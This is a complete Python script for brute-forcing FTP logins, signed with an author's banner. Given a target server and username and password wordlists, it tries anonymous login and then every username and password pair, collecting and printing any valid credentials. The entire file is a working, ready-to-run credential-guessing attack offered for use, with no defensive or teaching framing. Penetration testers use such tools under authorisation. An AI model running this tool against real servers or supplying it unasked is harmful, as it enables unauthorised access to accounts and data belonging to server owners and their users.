import argparse
import sys
from ftplib import FTP
from colorama import Fore as F, Back as B, Style as S

BB,BR,FT,FR,FG,FY,FB,FM,FC,ST,SD,SB = B.BLACK,B.RED,F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET_ALL,S.DIM,S.BRIGHT

credentials=[]

def main():
    print(SB,end="")
    print(FG,end="")
    parser = argparse.ArgumentParser()
    parser.add_argument("-T",help="Target",type=str)
    parser.add_argument("-L",help="Usernames Wordlist",type=str)
    parser.add_argument("-P",help="Password Worlist",type=str)
    parser.add_argument("-V",help="Verbose Mode",action="store_true")
    parser.add_argument("-X",help="Loop Around Users",action="store_true")
    parser.add_argument("-q",help="Quite banner",action="store_true")
    args=parser.parse_args()
    
    if(args.L and args.P and args.T):
        usernames=args.L
        passwords=args.P
        target=args.T
        verbose=args.V
        users_loop=args.X

    else:
        print("[-] Missing Parmeters Usage python3 ftp_bruteforce.py -h")
        sys.exit(0)
    if(args.q):
        print("",end="")
    else:
        signature()

    print("[*] FTP Bruteforce with Python")
    print("[+] Target Server : "+target)
    print("[+] Usernames Wordlist : "+usernames)
    print("[+] Passwords Wordlist : "+passwords)
    
    if(verbose):
        print("[+] Verbose Mode : ON")
    else:
        print("[+] Verbose Mode : OFF")

    print("[*] Checking Anonymous Login ")
    
    anon_login(target)    

    bruteforce(target,usernames,passwords,users_loop,verbose)

    if(len(credentials)==0):
        print("[-] No Valid Crdentials Found ")
        sys.exit(0)
    else:
        print("[+] Valid Credentials : ")
        for comb in credentials:
            print("[+] "+comb)

def anon_login(target):
    
    try:
        ftp=FTP(target)
        ftp.login('anonymous','password')
        ftp.quit()
        print("[+] Anonymous Login Success Try Username : Anonymous and Password : Password")
    except :
        print("[-] Anonymous Login Failed")
        pass

def bruteforce(target,usernames,passwords,users_loop,verbose):

    print("[*] Bruteforcing User Credentials")
    
    if(users_loop):
        users_loop_bruteforce(target,usernames,passwords,verbose)
    else:
        normal_bruteforce(target,usernames,passwords,verbose)

def normal_bruteforce(target,usernames,passwords,verbose):
    try :
        with open(usernames) as u:
            for user in u:
                user=user.strip()
                try :
                    with open(passwords) as p:
                        for password in p:
                            password=password.strip()
                            ftp_login(target,user,password,verbose)        
                except :
                    print("[-] Invalid Passwords file")
                    sys.exit(0)
    except :
        print("[-] Invalid Usernames file ")
        sys.exit(0)

def users_loop_bruteforce(target,usernames,passwords,verbose):
    try :
        with open(passwords) as p:
            for password in p:
                password=password.strip()
                try :
                    with open(usernames) as u:
                        for user in u:
                            user=user.strip()
                            ftp_login(target,user,password,verbose)
                except :
                    print("[-] Invalid Usernames file")
                    sys.exit(0)
    except :
        print("[-] Invalid Passwords file ")
        sys.exit(0)

def ftp_login(target,user,password,verbose):
    if(verbose):
        print("[+] Trying Credentials "+user+":"+password)
    try:
        ftp=FTP(target)
        ftp.login(user,password)
        ftp.quit()
        print("[*] Found Valid Credentials "+user+":"+password)
        valid=user+":"+password
        credentials.append(valid)
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt,Quitting the Program")
        sys.exit()
    except :
        pass    

def signature():
    header = "\n"+SB+FT+''+FR+'* * * * * * * * Vamsikrishna '+FR+'"'+FT+'V3GETA'+FR+'"'+FR+' Ramisetty * * * * * * * *\n'+ST
    print(header)
    SIG =""
    SIG+=FR+"     ██    ██ "+FT+"██████"+FY+"   ██████"+FT+"  ███████"+FB+" ████████"+FG+"  █████\n"
    SIG+=FR+"     ██    ██ "+FT+"     ██"+FY+" ██       "+FT+"██        "+FB+" ██"+FG+"    ██   ██ \n"
    SIG+=FR+"     ██    ██ "+FT+" █████"+FY+"  ██   ███"+FT+" █████   "+FB+"   ██"+FG+"    ███████ \n"
    SIG+=FR+"      ██  ██  "+FT+"     ██"+FY+" ██    ██"+FT+" ██        "+FB+" ██"+FG+"    ██   ██ \n"
    SIG+=FR+"       ████   "+FT+"██████"+FY+"   ██████"+FT+"  ███████ "+FB+"   ██"+FG+"    ██   ██ \n"
    SIG+="\n"
    SIG+=SB+""+FY+"      _______"+FR+"github.com/VamsiKrishna-Ramisetty"+FY+"_______\n"
    SIG+=FR+"\n* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * \n" 
    print(SIG)
    print(FG,end="")    

if __name__ == '__main__':
    main()

